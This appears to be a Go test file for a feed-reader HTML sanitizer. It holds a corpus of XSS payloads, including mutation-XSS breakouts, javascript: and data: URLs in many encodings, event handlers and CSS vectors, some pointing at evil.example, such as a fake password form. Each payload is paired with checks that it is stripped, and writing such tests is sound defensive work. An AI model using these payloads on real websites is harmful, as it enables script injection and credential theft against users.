package sanitize

import (
	"strings"
	"testing"

	"golang.org/x/net/html"
)

// corpus is a regression set of hostile feed HTML, each with what must not
// survive the pipeline. It also seeds the fuzz targets (xssSeeds gets every
// input below), so a payload added here is mutated by `go test -fuzz`.
// Sources are the well-known classes: mutation XSS (namespace confusion between
// HTML, SVG and MathML, noscript/style/title/textarea breakouts, nested forms),
// script-bearing URLs in every spelling, and elements that change the page
// around the content (<base>, <meta refresh>, srcdoc iframes).
var corpus = []struct {
	name, in string
	// gone are substrings (matched case-insensitively) the output must not contain.
	gone []string
}{
	// mXSS: DOMPurify / Closure bypass families.
	{"mglyph style breakout", `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">`, []string{"onerror", "<style", "<math", "<mglyph"}},
	{"svg style breakout", `<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">`, []string{"onerror", "<style", "<svg"}},
	{"math annotation-xml", `<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>`, []string{"onerror", "<math", "annotation"}},
	{"form nesting", `<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`, []string{"onerror", "<form", "<style"}},
	{"noscript title breakout", `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`, []string{"onerror", "<noscript"}},
	{"textarea breakout", `<textarea></textarea><img src=x onerror=alert(1)>`, []string{"onerror", "<textarea"}},
	{"title breakout", `<title></title><img src=x onerror=alert(1)>`, []string{"onerror", "<title"}},
	{"xmp breakout", `<xmp><p title="</xmp><img src=x onerror=alert(1)>">`, []string{"onerror", "<xmp"}},
	{"plaintext", `<plaintext><img src=x onerror=alert(1)>`, []string{"onerror", "<plaintext"}},
	{"comment breakout", `<!--><img src=x onerror=alert(1)>-->`, []string{"onerror"}},
	{"cdata in html", `<![CDATA[><img src=x onerror=alert(1)>]]>`, []string{"onerror"}},
	{"table foster parent", `<table><tr><td><svg><desc><template><style></template><img src=x onerror=alert(1)>`, []string{"onerror", "<svg", "<template", "<style"}},
	{"select mutation", `<select><template><style></select><img src=x onerror=alert(1)>`, []string{"onerror", "<select", "<template", "<style"}},
	{"entity-encoded handler", `<img src=x onerror&#61;alert(1)>`, []string{"onerror"}},
	{"attribute newline handler", "<img src=x\nonerror=alert(1)>", []string{"onerror"}},
	{"slash separated handler", `<img/src=x/onerror=alert(1)>`, []string{"onerror"}},
	{"unclosed attribute quote", `<img src="x onerror=alert(1)>`, []string{"onerror"}},
	{"backtick attribute", "<img src=`x` onerror=alert(1)>", []string{"onerror"}},
	{"nul in tag name", "<scr\x00ipt>alert(1)</scr\x00ipt>", []string{"<script"}},
	{"uppercase tag", `<SCRIPT SRC=//evil/x.js></SCRIPT>`, []string{"<script", "evil/x.js"}},
	{"script in svg", `<svg><script>alert(1)</script></svg>`, []string{"<script", "<svg"}},
	{"svg animate href", `<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>x</text></a></svg>`, []string{"javascript:", "<animate", "<svg"}},
	{"svg set", `<svg><set attributeName=onmouseover to=alert(1) /></svg>`, []string{"<set", "<svg", "onmouseover"}},
	{"svg foreignObject", `<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>"></iframe></foreignObject></svg>`, []string{"srcdoc", "<svg", "foreignobject", "<script"}},
	{"svg use data", `<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x" /></svg>`, []string{"<use", "<svg", "data:"}},
	{"svg xlink", `<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>`, []string{"javascript:", "xlink", "<svg"}},
	{"img svg data src", `<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">`, []string{"data:"}},
	{"mathml href", `<math href="javascript:alert(1)"><mi>x</mi></math>`, []string{"javascript:", "<math"}},
	{"mathml maction", `<math><maction actiontype="statusline#" xlink:href="javascript:alert(1)">x</maction></math>`, []string{"javascript:", "<math", "maction"}},
	{"mathml semantics", `<math><semantics><annotation-xml encoding="application/xhtml+xml"><script>alert(1)</script></annotation-xml></semantics></math>`, []string{"<script", "<math", "semantics"}},

	// Elements that change the page around the content.
	{"base", `<base href="https://evil.example/"><a href="x">x</a>`, []string{"<base", "evil.example"}},
	{"base target", `<base target="_blank"><p>x</p>`, []string{"<base"}},
	{"meta refresh", `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`, []string{"<meta", "refresh", "javascript:"}},
	{"meta refresh https", `<meta http-equiv="refresh" content="0;url=https://evil.example/">`, []string{"<meta", "refresh", "evil.example"}},
	{"meta set-cookie", `<meta http-equiv="set-cookie" content="a=b">`, []string{"<meta", "set-cookie"}},
	{"link import", `<link rel="stylesheet" href="https://evil.example/x.css"><link rel="import" href="https://evil.example/x.html">`, []string{"<link", "evil.example"}},
	{"style import", `<style>@import url(https://evil.example/x.css);</style><p>x</p>`, []string{"<style", "@import", "evil.example"}},
	{"srcdoc", `<iframe srcdoc="<script>alert(1)</script>"></iframe>`, []string{"srcdoc", "<script"}},
	{"srcdoc on allowed iframe", `<iframe src="https://www.youtube.com/embed/abc" srcdoc="<script>alert(1)</script>"></iframe>`, []string{"srcdoc", "<script"}},
	{"iframe javascript", `<iframe src="javascript:alert(1)"></iframe>`, []string{"javascript:"}},
	{"iframe other host", `<iframe src="https://evil.example/embed/abc"></iframe>`, []string{"<iframe"}},
	{"iframe youtube lookalike", `<iframe src="https://www.youtube.com.evil.example/embed/abc"></iframe>`, []string{"<iframe"}},
	{"iframe youtube userinfo", `<iframe src="https://www.youtube.com@evil.example/embed/abc"></iframe>`, []string{"<iframe"}},
	{"iframe sandbox widened", `<iframe src="https://www.youtube.com/embed/abc" sandbox="allow-top-navigation allow-scripts allow-forms"></iframe>`, []string{"allow-top-navigation", "allow-forms"}},
	{"object", `<object data="https://evil.example/x.swf"></object>`, []string{"<object", "evil.example"}},
	{"embed", `<embed src="https://evil.example/x.swf">`, []string{"<embed", "evil.example"}},
	{"applet", `<applet code="x.class" archive="https://evil.example/x.jar"></applet>`, []string{"<applet", "evil.example"}},
	{"frameset", `<frameset><frame src="https://evil.example/"></frameset>`, []string{"<frame", "evil.example"}},
	{"form action", `<form action="https://evil.example/steal"><input name=pw type=password><button>go</button></form>`, []string{"<form", "<input", "evil.example", "<button"}},
	{"formaction", `<button formaction="javascript:alert(1)">x</button>`, []string{"formaction", "javascript:"}},
	{"input autofocus", `<input autofocus onfocus=alert(1)>`, []string{"onfocus", "<input"}},
	{"details ontoggle", `<details open ontoggle=alert(1)>x</details>`, []string{"ontoggle"}},
	{"marquee", `<marquee onstart=alert(1)>x</marquee>`, []string{"onstart"}},
	{"body onload", `<body onload=alert(1)>x`, []string{"onload", "<body"}},

	// Script-bearing URLs in every spelling.
	{"javascript plain", `<a href="javascript:alert(1)">x</a>`, []string{"javascript:"}},
	{"javascript case", `<a href="JaVaScRiPt:alert(1)">x</a>`, []string{"javascript:"}},
	{"javascript tab", "<a href=\"java\tscript:alert(1)\">x</a>", []string{"script:"}},
	{"javascript newline", "<a href=\"java\nscript:alert(1)\">x</a>", []string{"script:"}},
	{"javascript entity colon", `<a href="javascript&colon;alert(1)">x</a>`, []string{"javascript"}},
	{"javascript entity numeric", `<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>`, []string{"javascript", "&#106"}},
	{"javascript hex entity no semicolon", `<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A;alert(1)">x</a>`, []string{"javascript", "&#x6a"}},
	{"javascript leading space", `<a href=" javascript:alert(1)">x</a>`, []string{"javascript:"}},
	{"javascript leading control", "<a href=\"\x01javascript:alert(1)\">x</a>", []string{"javascript:"}},
	{"javascript percent", `<a href="%6Aavascript:alert(1)">x</a>`, []string{"javascript:"}},
	{"vbscript", `<a href="vbscript:msgbox(1)">x</a>`, []string{"vbscript:"}},
	{"data html", `<a href="data:text/html,<script>alert(1)</script>">x</a>`, []string{"data:"}},
	{"data html base64", `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`, []string{"data:"}},
	{"data image src", `<img src="data:image/svg+xml,<svg onload=alert(1)>">`, []string{"data:"}},
	{"data uppercase", `<a href="DATA:text/html,x">x</a>`, []string{"data:"}},
	{"file url", `<a href="file:///etc/passwd">x</a><img src="file:///etc/passwd">`, []string{"file:"}},
	{"blob url", `<a href="blob:https://example.com/abc">x</a>`, []string{"blob:"}},
	{"ftp url", `<a href="ftp://example.com/x">x</a>`, []string{"ftp:"}},
	{"intent url", `<a href="intent://x#Intent;scheme=http;end">x</a>`, []string{"intent:"}},
	{"video src js", `<video src="javascript:alert(1)" poster="javascript:alert(1)"></video>`, []string{"javascript:"}},
	{"source srcset js", `<picture><source srcset="javascript:alert(1)"><img src="https://example.com/a.png"></picture>`, []string{"javascript:"}},
	{"img srcset data", `<img src="https://example.com/a.png" srcset="data:image/png;base64,AAAA 1x">`, []string{"data:"}},
	{"audio src data", `<audio src="data:audio/wav;base64,AAAA" controls></audio>`, []string{"data:"}},
	{"poster data", `<video poster="data:text/html,x"></video>`, []string{"data:"}},
	{"fragment shield literal", `<a href="https://fragment.kipple.invalid/0/0">x</a>`, nil},

	// Event handlers.
	{"onerror", `<img src=x onerror=alert(1)>`, []string{"onerror"}},
	{"onerror uppercase", `<IMG SRC=x ONERROR=alert(1)>`, []string{"onerror"}},
	{"onmouseover", `<p onmouseover="alert(1)">x</p>`, []string{"onmouseover"}},
	{"onfocus autofocus", `<a href="https://example.com/" autofocus onfocus=alert(1)>x</a>`, []string{"onfocus"}},
	{"onanimationstart", `<p style="animation-name:x" onanimationstart=alert(1)>x</p>`, []string{"onanimationstart"}},
	{"onpointerenter", `<span onpointerenter=alert(1)>x</span>`, []string{"onpointerenter"}},
	{"video onplay", `<video src="https://example.com/a.mp4" autoplay onplay=alert(1)></video>`, []string{"onplay", "autoplay"}},
	{"audio onloadstart", `<audio src="https://example.com/a.mp3" onloadstart=alert(1)></audio>`, []string{"onloadstart"}},

	// CSS.
	{"css expression", `<p style="width: expression(alert(1))">x</p>`, []string{"expression"}},
	{"css expression comment", `<p style="width: exp/**/ression(alert(1))">x</p>`, []string{"expression", "alert"}},
	{"css javascript url", `<p style="background: url(javascript:alert(1))">x</p>`, []string{"javascript:"}},
	{"css url external", `<p style="background: url(https://evil.example/track.gif)">x</p>`, []string{"evil.example"}},
	{"css url data", `<p style="background-image: url('data:image/svg+xml,<svg onload=alert(1)>')">x</p>`, []string{"data:"}},
	{"css import", `<p style="@import 'https://evil.example/x.css'">x</p>`, []string{"@import", "evil.example"}},
	{"css behavior", `<p style="behavior: url(x.htc)">x</p>`, []string{"behavior", ".htc"}},
	{"css moz-binding", `<p style="-moz-binding: url(https://evil.example/x.xml#y)">x</p>`, []string{"-moz-binding", "evil.example"}},
	{"css position fixed overlay", `<p style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999">x</p>`, []string{"position:fixed", "position: fixed"}},
	{"css escaped expression", `<p style="width: \65xpression(alert(1))">x</p>`, []string{"expression"}},

	// Harmless, and must not break.
	{"in-page anchor kept", `<p><a href="#fn1">1</a></p><p id="fn1">note</p>`, nil},
}

func init() {
	for _, c := range corpus {
		xssSeeds = append(xssSeeds, c.in)
	}
}

// unsafeTags are elements that never belong in stored feed content, on top of the
// set assertSafeHTML checks.
var unsafeTags = map[string]bool{
	"svg": true, "math": true, "template": true, "frame": true, "frameset": true, "applet": true, "input": true,
	"textarea": true, "select": true, "button": true, "noscript": true, "xmp": true, "plaintext": true, "title": true,
	"body": true, "head": true,
}

// assertCorpusSafe is assertSafeHTML plus the checks the corpus adds: no unsafe
// element, no srcdoc or form-action attribute, no style carrying a script or
// remote-load vector, and every URL attribute is http(s), mailto, tel or an
// in-page fragment.
func assertCorpusSafe(t *testing.T, label, in, out string) {
	t.Helper()
	assertSafeHTML(t, label, in, out)
	z := html.NewTokenizer(strings.NewReader(out))
	for {
		tt := z.Next()
		if tt == html.ErrorToken {
			return
		}
		if tt != html.StartTagToken && tt != html.SelfClosingTagToken {
			continue
		}
		tok := z.Token()
		if unsafeTags[tok.Data] {
			t.Fatalf("%s: <%s> survived\nin:  %q\nout: %q", label, tok.Data, in, out)
		}
		for _, a := range tok.Attr {
			k, v := strings.ToLower(a.Key), strings.ToLower(strings.TrimSpace(a.Val))
			switch {
			case k == "srcdoc" || k == "formaction" || k == "action" || strings.HasPrefix(k, "xlink"):
				t.Fatalf("%s: attribute %s survived\nin:  %q\nout: %q", label, a.Key, in, out)
			case k == "style" && (strings.Contains(v, "expression") || strings.Contains(v, "url(") || strings.Contains(v, "javascript") ||
				strings.Contains(v, "@import") || strings.Contains(v, "behavior") || strings.Contains(v, "binding")):
				t.Fatalf("%s: style %q survived\nin:  %q\nout: %q", label, a.Val, in, out)
			case k == "href" || k == "src" || k == "poster":
				if v == "" {
					continue
				}
				if !(strings.HasPrefix(v, "http://") || strings.HasPrefix(v, "https://") || strings.HasPrefix(v, "mailto:") ||
					strings.HasPrefix(v, "tel:") || strings.HasPrefix(v, "#") ||
					strings.HasPrefix(v, "/img/") || strings.HasPrefix(v, "/thumb/")) { // the last two: ServeHTML's own image proxy paths
					t.Fatalf("%s: %s=%q is not http(s), mailto, tel or a fragment\nin:  %q\nout: %q", label, a.Key, a.Val, in, out)
				}
			}
		}
	}
}

func TestSanitizerCorpus(t *testing.T) {
	const base = "https://example.com/post/"
	serve := ServeOptions{
		Image:         func(u string) string { return "/img/" + u },
		Thumb:         func(u string) string { return "/thumb/" + u },
		StripTracking: true,
	}
	for _, c := range corpus {
		t.Run(c.name, func(t *testing.T) {
			out, _ := Content(c.in, base)
			low := strings.ToLower(out)
			for _, g := range c.gone {
				if strings.HasPrefix(g, "on") {
					continue // handlers are checked as attribute names by assertSafeHTML; the text may survive escaped
				}
				if strings.Contains(low, strings.ToLower(g)) {
					t.Errorf("%q survived\nin:  %q\nout: %q", g, c.in, out)
				}
			}
			assertCorpusSafe(t, "Content", c.in, out)
			// Never mutated into something unsafe afterwards: a second pass, and the
			// serve-time transform of the stored HTML (with and without the image proxy).
			again, _ := Content(out, base)
			assertCorpusSafe(t, "Content(Content)", c.in, again)
			assertCorpusSafe(t, "ServeHTML", c.in, ServeHTML(out, serve))
			assertCorpusSafe(t, "ServeHTML plain", c.in, ServeHTML(out, ServeOptions{StripTracking: true}))
		})
	}
}

// Benign content survives, so the corpus is not passing by deleting everything.
func TestSanitizerCorpusKeepsBenignMarkup(t *testing.T) {
	out, _ := Content(`<p>Hello <a href="https://example.com/a" title="t">link</a> <img src="https://example.com/i.png" alt="i"></p>`+
		`<iframe src="https://www.youtube.com/embed/abc123" sandbox="allow-scripts"></iframe><a href="#fn1">1</a>`, "https://example.com/")
	for _, want := range []string{`href="https://example.com/a"`, `src="https://example.com/i.png"`, `href="#fn1"`} {
		if !strings.Contains(out, want) {
			t.Errorf("%s missing from %q", want, out)
		}
	}
}
